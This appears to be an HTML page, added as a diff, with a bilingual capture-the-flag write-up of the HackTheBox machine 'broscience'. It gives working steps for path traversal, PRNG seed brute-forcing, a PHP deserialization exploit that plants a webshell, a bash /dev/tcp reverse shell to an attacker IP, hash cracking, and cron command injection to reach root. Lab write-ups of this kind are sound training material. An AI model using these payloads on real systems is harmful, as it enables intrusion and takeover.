@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>broscience | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">broscience</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack began by discovering a path traversal vulnerability in the <code>img.php</code> file that required double URL encoding to bypass filters, allowing me to read arbitrary files from the system including PHP source code. By analyzing the downloaded source code, I identified a weakness in the activation code generation function that used <code>srand(time())</code> with predictable seeding, enabling me to brute-force activation codes within a narrow time window and activate my user account. Once authenticated, I discovered that the application used insecure deserialization on the <code>user-prefs</code> cookie without validation. Leveraging the <code>AvatarInterface</code> and <code>Avatar</code> classes present in the codebase with their <code>__wakeup()</code> magic method, I crafted a malicious serialized object that read my PHP session file (which I had poisoned with a webshell by changing my username) and wrote it to a new accessible PHP file, achieving remote code execution as <code>www-data</code>. After obtaining database credentials through the path traversal, I cracked MD5 password hashes (salted with a known salt) using hashcat, gaining lateral access as user <code>bill</code>. For privilege escalation, I discovered a certificate renewal script executed periodically by root via cron that was vulnerable to command injection through shell variable expansion in the certificate's Common Name field. By crafting a malicious certificate with <code>$(chmod u+s /bin/bash)</code> as the CN and placing it where the cron job expected, I successfully made bash SUID when root executed the script, allowing me to spawn a root shell.</p>
+                    <p><strong>Technologies/Exploits:</strong> Path traversal with double URL encoding bypass, predictable PRNG seed exploitation in PHP, insecure PHP deserialization attack using magic methods, PostgreSQL hash cracking, OpenSSL command injection via variable expansion abuse in bash scripts.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to enumerate the target machine's open ports and services:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and HTTPS on 443" /></p>
+                
+                <p>The scan reveals SSH on port 22 and HTTP/HTTPS web services on ports 80 and 443. I add <code>broscience.htb</code> to my <code>/etc/hosts</code> file to properly resolve the domain.</p>
+                
+                <h2>Web Enumeration</h2>
+                <p>Navigating to the website, I discover it's a fitness/bodybuilding themed application with user registration, login functionality, and exercise pages. When I register a new user, the application prompts me to check my email for an activation code. Attempting to log in with the unactivated account results in an error message stating the account hasn't been activated yet.</p>
+                
+                <p>Running gobuster to discover hidden directories and files, I find several interesting endpoints:</p>
+                <pre><code class="language-plaintext">200 GET 29l 70w 1309c https://broscience.htb/user.php
+200 GET 28l 71w 1322c https://broscience.htb/exercise.php
+200 GET 1l 4w 39c https://broscience.htb/includes/img.php
+200 GET 42l 97w 1936c https://broscience.htb/login.php
+200 GET 147l 510w 9301c https://broscience.htb/index.php
+200 GET 45l 104w 2161c https://broscience.htb/register.php
+302 GET 1l 3w 13c https://broscience.htb/comment.php
+301 GET 9l 28w 321c https://broscience.htb/includes
+302 GET 0l 0w 0c https://broscience.htb/logout.php</code></pre>
+                
+                <h2>Path Traversal Discovery</h2>
+                <p>The <code>/includes/img.php</code> endpoint immediately catches my attention. When I visit it directly, I see an error message:</p>
+                <p><img src="./media/image2.png" alt="Error message from img.php showing 'Missing Parameter'" /></p>
+                
+                <p>Testing for path traversal by adding a <code>path</code> parameter reveals interesting behavior:</p>
+                <p><img src="./media/image6.png" alt="Path traversal test showing filtered traversal sequences" /></p>
+                
+                <p>Standard path traversal attempts using <code>../</code> sequences are being filtered. Single URL encoding (<code>..%2F</code>) is also blocked:</p>
+                <p><img src="./media/image5.png" alt="Single URL encoding bypass attempt being filtered" /></p>
+                
+                <p>However, the vulnerability can be exploited using <strong>double URL encoding</strong>. By encoding the <code>%</code> symbol itself as <code>%25</code>, making <code>../</code> become <code>..%252F</code>, I successfully bypass the filter:</p>
+                
+                <pre><code class="language-bash">curl "https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd" -k | grep bash</code></pre>
+                
+                <p>This returns user accounts with bash shells:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</code></pre>
+                
+                <p>I create a Python script to automate this process and make file system exploration more convenient.</p>
+                
+                <h3>Extracting Source Code and Credentials</h3>
+                <p>Using the path traversal vulnerability, I extract the PHP source files from <code>/var/www/html/</code>. In the database configuration file, I find credentials:</p>
+                
+                <pre><code class="language-php">$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";</code></pre>
+                
+                <p>These credentials don't work for SSH as user <code>bill</code> or <code>root</code>, so I continue investigating other attack vectors.</p>
+                
+                <p>I check the Apache configuration to see if log poisoning might be possible. The logs should be in <code>/var/log/apache2/</code>, but attempting to read them returns nothing—likely the web server user lacks read permissions. PHP filter wrappers also don't yield results.</p>
+                
+                <h2>Activation Code Vulnerability Analysis</h2>
+                <p>Examining all downloaded PHP files, I discover a critical vulnerability in <code>utils.php</code>—specifically in the activation code generation function:</p>
+                
+                <pre><code class="language-php">function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}</code></pre>
+                
+                <p>This function has a severe security flaw: it seeds the random number generator using <code>srand(time())</code>, which uses the current Unix timestamp. Since I know approximately when the activation code is generated (immediately upon registration), I can brute-force possible codes within a narrow time window.</p>
+                
+                <h3>Brute-forcing the Activation Code</h3>
+                <p>I develop a PHP script using an LLM assistant that generates activation codes for timestamps within a 10-second window before and after registration. The script fetches the server time, then systematically generates codes for each possible seed:</p>
+                
+                <pre><code class="language-bash">php attack_generator.php</code></pre>
+                
+                <p>The output shows the successful brute-force:</p>
+                <pre><code class="language-plaintext">[*] Fetching server time...
+[*] Server time: Fri, 26 Dec 2025 13:01:07 GMT (1766754067)
+[*] Brute-forcing seeds from 1766754057 to 1766754077...
+Testing Seed 1766754066: 2gXzAyXCRxVo6XZ0KnpSY0Hlw1zPm1bB
+[+] SUCCESS!
+[+] Seed found: 1766754066
+[+] Activation Code: 2gXzAyXCRxVo6XZ0KnpSY0Hlw1zPm1bB</code></pre>
+                
+                <p>Using this activation code, I successfully activate my account and can now fully access the application.</p>
+                
+                <h2>PHP Deserialization Vulnerability</h2>
+                <p>After logging in, I investigate all application functionality. While there don't appear to be SQL injection vulnerabilities, I notice an unusual cookie that wasn't present before:</p>
+                
+                <pre><code class="language-plaintext">user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D</code></pre>
+                
+                <p>The <code>%3D</code> is URL encoding for <code>=</code>, suggesting this is base64 encoded data. Decoding it reveals:</p>
+                
+                <pre><code class="language-bash">echo "Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=" | base64 -d</code></pre>
+                
+                <pre><code class="language-plaintext">O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}</code></pre>
+                
+                <p>This is a serialized PHP object! Searching through the source code, I find where this cookie is processed:</p>
+                
+                <pre><code class="language-php">if (isset($_SESSION['id'])) {
+    if (!isset($_COOKIE['user-prefs'])) {
+        $up_cookie = base64_encode(serialize(new UserPrefs()));
+        setcookie('user-prefs', $up_cookie);
+    } else {
+        $up_cookie = $_COOKIE['user-prefs'];
+    }
+    $up = unserialize(base64_decode($up_cookie));
+    return $up->theme;
+}</code></pre>
+                
+                <p>The critical issue here is that the application calls <code>unserialize()</code> directly on user-controlled input from the cookie without any validation. This is a textbook insecure deserialization vulnerability.</p>
+                
+                <h3>Identifying Gadget Classes</h3>
+                <p>For a successful deserialization attack, I need to find "gadget" classes in the codebase that can be abused. Conveniently, there are two classes for a future avatar feature (marked with a TODO comment in <code>user.php</code>):</p>
+                
+                <pre><code class="language-php">class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath;
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}</code></pre>
+                
+                <p>The <code>AvatarInterface</code> class has a <code>__wakeup()</code> magic method, which is automatically called by PHP when an object is unserialized. According to the <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">PHP documentation</a>, "unserialize() checks for the presence of a function with the magic name __wakeup()."</p>
+                
+                <p>The attack chain works as follows:</p>
+                <ol>
+                    <li>Create a serialized <code>AvatarInterface</code> object with controlled <code>$tmp</code> and <code>$imgPath</code> properties</li>
+                    <li>When unserialized, <code>__wakeup()</code> is automatically called</li>
+                    <li>This creates an <code>Avatar</code> object with our controlled <code>$imgPath</code></li>
+                    <li>The <code>save()</code> method reads the file at <code>$tmp</code> using <code>file_get_contents()</code></li>
+                    <li>The content is written to the file specified in <code>$imgPath</code></li>
+                </ol>
+                
+                <h2>Exploiting Deserialization for RCE</h2>
+                <p>My strategy is to:</p>
+                <ol>
+                    <li>Change my username to a PHP webshell via the user profile update functionality</li>
+                    <li>Create a malicious serialized object that reads my PHP session file (which contains my username/webshell)</li>
+                    <li>Write that session content to a new accessible PHP file</li>
+                    <li>Execute commands through the newly created webshell</li>
+                </ol>
+                
+                <h3>Step 1: Poisoning the Session File</h3>
+                <p>I change my username to a PHP webshell payload through the user update functionality:</p>
+                <p><img src="./media/image3.png" alt="Changing username to PHP webshell payload in user profile settings" /></p>
+                
+                <h3>Step 2: Creating the Malicious Serialized Object</h3>
+                <p>I create a PHP script that generates the malicious serialized cookie:</p>
+                
+                <pre><code class="language-php"><?php
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath;
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+
+$avatar_interface = new AvatarInterface();
+$avatar_interface->tmp = "/var/lib/php/sessions/sess_jpo8v40orkkava8bb8h9em11a9";
+$avatar_interface->imgPath = "./shell.php";
+
+$cookie = base64_encode(serialize($avatar_interface));
+echo $cookie;
+?></code></pre>
+                
+                <p>This script creates an <code>AvatarInterface</code> object that will read my poisoned session file and write it to <code>shell.php</code> in the web root.</p>
+                
+                <h3>Step 3: Triggering the Exploit</h3>
+                <p>I replace my <code>user-prefs</code> cookie with the malicious serialized object and refresh the page. The application deserializes my object, triggering the <code>__wakeup()</code> method, which successfully creates the webshell:</p>
+                <p><img src="./media/image4.png" alt="Successfully created webshell visible in the page source showing PHP session content" /></p>
+                
+                <h3>Step 4: Getting a Reverse Shell</h3>
+                <p>Now I can execute commands through the webshell. I send myself a reverse shell using this payload:</p>
+                
+                <pre><code class="language-bash">https://broscience.htb/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26/dev/tcp/10.10.16.2/443%200%3E%261%22</code></pre>
+                
+                <p>On my netcat listener:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.233] 56104
+bash: cannot set terminal process group (879): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@broscience:/var/www/html$</code></pre>
+                
+                <p>I now have shell access as <code>www-data</code>.</p>
+                
+                <h2>Lateral Movement to User Bill</h2>
+                <p>Exploring the system, I find a user named <code>bill</code> in <code>/home</code>. I also notice a script in <code>/opt</code> called <code>renew_cert.sh</code> owned by root, which I suspect will be useful for privilege escalation later.</p>
+                
+                <p>Remembering the PostgreSQL credentials I found earlier, I connect to the database and extract password hashes:</p>
+                
+                <pre><code class="language-sql">SELECT username, password FROM users;</code></pre>
+                
+                <p>I retrieve several MD5 hashes:</p>
+                <pre><code class="language-plaintext">15657792073e8a843d4f91fc403454e1  (admin)
+13edad4932da9dbb57d9cd15b66ed104  (bill)
+bd3dad50e2d578ecba87d5fa15ca5f85  (michael)
+a7eed23a7be6fe0d765197b1027453fe  (john)
+5d15340bded5b9395d5d14b9c21bc82b  (dmytro)</code></pre>
+                
+                <p>From the database configuration file, I know these hashes are salted with <code>NaCl</code> using the format <code>md5($salt . $password)</code>. This corresponds to hashcat mode 20:</p>
+                
+                <pre><code class="language-plaintext">20 | md5($salt.$pass) | Raw Hash, Salted and/or Iterated</code></pre>
+                
+                <p>I create a file with the hashes in the proper format (<code>hash:salt</code>) and run hashcat:</p>
+                
+                <pre><code class="language-bash">hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+                
+                <p>Three hashes successfully crack:</p>
+                <pre><code class="language-plaintext">bill    => 13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+dmytro  => 5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
+michael => bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples</code></pre>
+                
+                <p>Bill's credentials work for SSH, allowing me to log in as <code>bill</code> and retrieve the user flag.</p>
+                
+                <h2>Privilege Escalation - Certificate Renewal Script Analysis</h2>
+                <p>After gaining access as bill, I investigate potential privilege escalation vectors. I don't have sudo privileges to run the certificate renewal script directly, and it's not SUID either. My hypothesis is that the script runs periodically as root.</p>
+                
+                <p>To confirm this, I transfer <code>pspy64</code> to the target machine and execute it to monitor running processes. After a short wait, I observe:</p>
+                
+                <pre><code class="language-plaintext">2025/12/26 10:52:01 CMD: UID=0 PID=5632 | /bin/bash /root/cron.sh
+2025/12/26 10:52:01 CMD: UID=0 PID=5633 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+2025/12/26 10:52:01 CMD: UID=0 PID=5634 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt</code></pre>
+                
+                <p>Perfect! Root is executing the script periodically via cron, looking for a certificate at <code>/home/bill/Certs/broscience.crt</code> and passing it as an argument.</p>
+                
+                <h3>Analyzing the Vulnerable Script</h3>
+                <p>Examining the <code>renew_cert.sh</code> script, I find this vulnerable line:</p>
+                
+                <pre><code class="language-bash">/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"</code></pre>
+                
+                <p>The <code>$commonName</code> variable is extracted from the certificate's Common Name field. The critical vulnerability here is that bash will perform <strong>command substitution</strong> on this variable before executing the command. If I can inject a command using the <code>$(command)</code> syntax in the Common Name field, it will be executed as root.</p>
+                
+                <h3>Testing Command Injection</h3>
+                <p>I create a test certificate with a malicious Common Name to verify the vulnerability:</p>
+                
+                <pre><code class="language-bash">openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null -out /tmp/xd.crt -days 1</code></pre>
+                
+                <p>When prompted for the Common Name, I enter: <code>$(id)</code></p>
+                
+                <p>Manually executing the script on this certificate shows:</p>
+                
+                <pre><code class="language-bash">/opt/renew_cert.sh /tmp/xd.crt</code></pre>
+                
+                <pre><code class="language-plaintext">C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, OU = section, CN = $(id)
+Country => AU
+State => Some-State
+Locality =>
+Org Name => Internet Widgits Pty Ltd
+Org Unit => section
+Common Name => $(id)
+Email =>
+Generating certificate...
+mv: target 'groups=1000(bill).crt' is not a directory</code></pre>
+                
+                <p>The error message reveals that the <code>id</code> command was executed! The output shows <code>groups=1000(bill)</code>, proving command injection works.</p>
+                
+                <h2>Exploiting Command Injection for Root</h2>
+                <p>Now I'll create a malicious certificate that will be picked up by the cron job. My payload will make <code>/bin/bash</code> SUID, allowing me to spawn a root shell:</p>
+                
+                <pre><code class="language-bash">openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null -out /home/bill/Certs/broscience.crt -days 1</code></pre>
+                
+                <p>For the Common Name, I use: <code>$(chmod u+s /bin/bash)</code></p>
+                
+                <p>This generates a certificate at the exact location where the cron job expects to find it. When root executes the script on this certificate, the command substitution will trigger, making bash SUID.</p>
+                
+                <p>After waiting for the cron job to execute, I verify that bash is now SUID:</p>
+                
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash</code></pre>
+                
+                <p>Perfect! Now I can spawn a root shell using bash's <code>-p</code> flag (which preserves the SUID privileges):</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">bash-5.1# id
+uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
+bash-5.1# cat /root/root.txt</code></pre>
+                
+                <p>I successfully retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> El ataque comenzó descubriendo una vulnerabilidad de path traversal en el archivo <code>img.php</code> que requería doble codificación URL para eludir los filtros, permitiéndome leer archivos arbitrarios del sistema incluyendo código fuente PHP. Analizando el código fuente descargado, identifiqué una debilidad en la función de generación de códigos de activación que utilizaba <code>srand(time())</code> con una semilla predecible, permitiéndome realizar fuerza bruta a los códigos de activación dentro de una ventana temporal estrecha y activar mi cuenta de usuario. Una vez autenticado, descubrí que la aplicación utilizaba deserialización insegura en la cookie <code>user-prefs</code> sin validación. Aprovechando las clases <code>AvatarInterface</code> y <code>Avatar</code> presentes en el código con su método mágico <code>__wakeup()</code>, diseñé un objeto serializado malicioso que leyó mi archivo de sesión PHP (que había envenenado con una webshell cambiando mi nombre de usuario) y lo escribió en un nuevo archivo PHP accesible, logrando ejecución remota de código como <code>www-data</code>. Tras obtener credenciales de la base de datos mediante el path traversal, crackeé hashes de contraseñas MD5 (salteadas con una sal conocida) usando hashcat, obteniendo acceso lateral como usuario <code>bill</code>. Para la escalada de privilegios, descubrí un script de renovación de certificados ejecutado periódicamente por root mediante cron que era vulnerable a inyección de comandos mediante expansión de variables de shell en el campo Common Name del certificado. Creando un certificado malicioso con <code>$(chmod u+s /bin/bash)</code> como CN y colocándolo donde el trabajo cron lo esperaba, conseguí hacer bash SUID cuando root ejecutó el script, permitiéndome generar una shell root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Path traversal con bypass de doble codificación URL, explotación de semilla PRNG predecible en PHP, ataque de deserialización insegura en PHP usando métodos mágicos, crackeo de hashes PostgreSQL, inyección de comandos OpenSSL mediante abuso de expansión de variables en scripts bash.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para enumerar los puertos abiertos y servicios de la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y HTTPS en el 443" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y servicios web HTTP/HTTPS en los puertos 80 y 443. Añado <code>broscience.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el dominio.</p>
+                
+                <h2>Enumeración Web</h2>
+                <p>Navegando al sitio web, descubro que es una aplicación temática de fitness/culturismo con registro de usuarios, funcionalidad de login y páginas de ejercicios. Cuando registro un nuevo usuario, la aplicación me indica que compruebe mi correo para un código de activación. Al intentar hacer login con la cuenta sin activar obtengo un mensaje de error indicando que la cuenta no ha sido activada todavía.</p>
+                
+                <p>Ejecutando gobuster para descubrir directorios y archivos ocultos, encuentro varios endpoints interesantes:</p>
+                <pre><code class="language-plaintext">200 GET 29l 70w 1309c https://broscience.htb/user.php
+200 GET 28l 71w 1322c https://broscience.htb/exercise.php
+200 GET 1l 4w 39c https://broscience.htb/includes/img.php
+200 GET 42l 97w 1936c https://broscience.htb/login.php
+200 GET 147l 510w 9301c https://broscience.htb/index.php
+200 GET 45l 104w 2161c https://broscience.htb/register.php
+302 GET 1l 3w 13c https://broscience.htb/comment.php
+301 GET 9l 28w 321c https://broscience.htb/includes
+302 GET 0l 0w 0c https://broscience.htb/logout.php</code></pre>
+                
+                <h2>Descubrimiento de Path Traversal</h2>
+                <p>El endpoint <code>/includes/img.php</code> llama inmediatamente mi atención. Al visitarlo directamente, veo un mensaje de error:</p>
+                <p><img src="./media/image2.png" alt="Mensaje de error de img.php mostrando 'Missing Parameter'" /></p>
+                
+                <p>Testeando path traversal añadiendo un parámetro <code>path</code> revela un comportamiento interesante:</p>
+                <p><img src="./media/image6.png" alt="Prueba de path traversal mostrando secuencias de traversal filtradas" /></p>
+                
+                <p>Los intentos estándar de path traversal usando secuencias <code>../</code> están siendo filtrados. La codificación URL simple (<code>..%2F</code>) también está bloqueada:</p>
+                <p><img src="./media/image5.png" alt="Intento de bypass con codificación URL simple siendo filtrado" /></p>
+                
+                <p>Sin embargo, la vulnerabilidad puede explotarse usando <strong>doble codificación URL</strong>. Codificando el símbolo <code>%</code> en sí mismo como <code>%25</code>, haciendo que <code>../</code> se convierta en <code>..%252F</code>, bypaseo exitosamente el filtro:</p>
+                
+                <pre><code class="language-bash">curl "https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd" -k | grep bash</code></pre>
+                
+                <p>Esto devuelve las cuentas de usuario con shells bash:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</code></pre>
+                
+                <p>Creo un script de Python para automatizar este proceso y hacer más conveniente la exploración del sistema de archivos.</p>
+                
+                <h3>Extrayendo Código Fuente y Credenciales</h3>
+                <p>Usando la vulnerabilidad de path traversal, extraigo los archivos fuente PHP de <code>/var/www/html/</code>. En el archivo de configuración de la base de datos, encuentro credenciales:</p>
+                
+                <pre><code class="language-php">$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";</code></pre>
+                
+                <p>Estas credenciales no funcionan para SSH como usuario <code>bill</code> o <code>root</code>, así que continúo investigando otros vectores de ataque.</p>
+                
+                <p>Compruebo la configuración de Apache para ver si el log poisoning sería posible. Los logs deberían estar en <code>/var/log/apache2/</code>, pero al intentar leerlos no devuelve nada—probablemente el usuario del servidor web carece de permisos de lectura. Los wrappers de filtros PHP tampoco dan resultados.</p>
+                
+                <h2>Análisis de Vulnerabilidad en Código de Activación</h2>
+                <p>Examinando todos los archivos PHP descargados, descubro una vulnerabilidad crítica en <code>utils.php</code>—específicamente en la función de generación del código de activación:</p>
+                
+                <pre><code class="language-php">function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(time());
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $activation_code;
+}</code></pre>
+                
+                <p>Esta función tiene un fallo de seguridad severo: inicializa el generador de números aleatorios usando <code>srand(time())</code>, que utiliza la marca temporal Unix actual. Como sé aproximadamente cuándo se genera el código de activación (inmediatamente tras el registro), puedo realizar fuerza bruta a los códigos posibles dentro de una ventana temporal estrecha.</p>
+                
+                <h3>Fuerza Bruta al Código de Activación</h3>
+                <p>Desarrollo un script PHP usando un asistente LLM que genera códigos de activación para marcas temporales dentro de una ventana de 10 segundos antes y después del registro. El script obtiene el tiempo del servidor, luego genera sistemáticamente códigos para cada semilla posible:</p>
+                
+                <pre><code class="language-bash">php attack_generator.php</code></pre>
+                
+                <p>La salida muestra la fuerza bruta exitosa:</p>
+                <pre><code class="language-plaintext">[*] Fetching server time...
+[*] Server time: Fri, 26 Dec 2025 13:01:07 GMT (1766754067)
+[*] Brute-forcing seeds from 1766754057 to 1766754077...
+Testing Seed 1766754066: 2gXzAyXCRxVo6XZ0KnpSY0Hlw1zPm1bB
+[+] SUCCESS!
+[+] Seed found: 1766754066
+[+] Activation Code: 2gXzAyXCRxVo6XZ0KnpSY0Hlw1zPm1bB</code></pre>
+                
+                <p>Usando este código de activación, activo exitosamente mi cuenta y ahora puedo acceder completamente a la aplicación.</p>
+                
+                <h2>Vulnerabilidad de Deserialización PHP</h2>
+                <p>Tras iniciar sesión, investigo toda la funcionalidad de la aplicación. Aunque no parecen haber vulnerabilidades de inyección SQL, noto una cookie inusual que no estaba presente antes:</p>
+                
+                <pre><code class="language-plaintext">user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D</code></pre>
+                
+                <p>El <code>%3D</code> es codificación URL para <code>=</code>, sugiriendo que esto son datos codificados en base64. Decodificándolo revela:</p>
+                
+                <pre><code class="language-bash">echo "Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=" | base64 -d</code></pre>
+                
+                <pre><code class="language-plaintext">O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}</code></pre>
+                
+                <p>¡Esto es un objeto PHP serializado! Buscando a través del código fuente, encuentro dónde se procesa esta cookie:</p>
+                
+                <pre><code class="language-php">if (isset($_SESSION['id'])) {
+    if (!isset($_COOKIE['user-prefs'])) {
+        $up_cookie = base64_encode(serialize(new UserPrefs()));
+        setcookie('user-prefs', $up_cookie);
+    } else {
+        $up_cookie = $_COOKIE['user-prefs'];
+    }
+    $up = unserialize(base64_decode($up_cookie));
+    return $up->theme;
+}</code></pre>
+                
+                <p>El problema crítico aquí es que la aplicación llama a <code>unserialize()</code> directamente sobre la entrada controlada por el usuario desde la cookie sin ninguna validación. Esto es una vulnerabilidad de deserialización insegura de libro.</p>
+                
+                <h3>Identificando Clases Gadget</h3>
+                <p>Para un ataque de deserialización exitoso, necesito encontrar clases "gadget" en el código base que puedan ser abusadas. Convenientemente, hay dos clases para una futura funcionalidad de avatar (marcadas con un comentario TODO en <code>user.php</code>):</p>
+                
+                <pre><code class="language-php">class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath;
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}</code></pre>
+                
+                <p>La clase <code>AvatarInterface</code> tiene un método mágico <code>__wakeup()</code>, que PHP llama automáticamente cuando se deserializa un objeto. Según la <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">documentación de PHP</a>, "unserialize() comprueba la presencia de una función con el nombre mágico __wakeup()."</p>
+                
+                <p>La cadena de ataque funciona así:</p>
+                <ol>
+                    <li>Crear un objeto <code>AvatarInterface</code> serializado con propiedades <code>$tmp</code> y <code>$imgPath</code> controladas</li>
+                    <li>Cuando se deserializa, <code>__wakeup()</code> se llama automáticamente</li>
+                    <li>Esto crea un objeto <code>Avatar</code> con nuestro <code>$imgPath</code> controlado</li>
+                    <li>El método <code>save()</code> lee el archivo en <code>$tmp</code> usando <code>file_get_contents()</code></li>
+                    <li>El contenido se escribe en el archivo especificado en <code>$imgPath</code></li>
+                </ol>
+                
+                <h2>Explotando la Deserialización para RCE</h2>
+                <p>Mi estrategia es:</p>
+                <ol>
+                    <li>Cambiar mi nombre de usuario a una webshell PHP mediante la funcionalidad de actualización de perfil</li>
+                    <li>Crear un objeto serializado malicioso que lea mi archivo de sesión PHP (que contiene mi nombre de usuario/webshell)</li>
+                    <li>Escribir ese contenido de sesión en un nuevo archivo PHP accesible</li>
+                    <li>Ejecutar comandos a través de la webshell recién creada</li>
+                </ol>
+                
+                <h3>Paso 1: Envenenando el Archivo de Sesión</h3>
+                <p>Cambio mi nombre de usuario a un payload de webshell PHP mediante la funcionalidad de actualización de usuario:</p>
+                <p><img src="./media/image3.png" alt="Cambiando el nombre de usuario a un payload de webshell PHP en la configuración del perfil de usuario" /></p>
+                
+                <h3>Paso 2: Creando el Objeto Serializado Malicioso</h3>
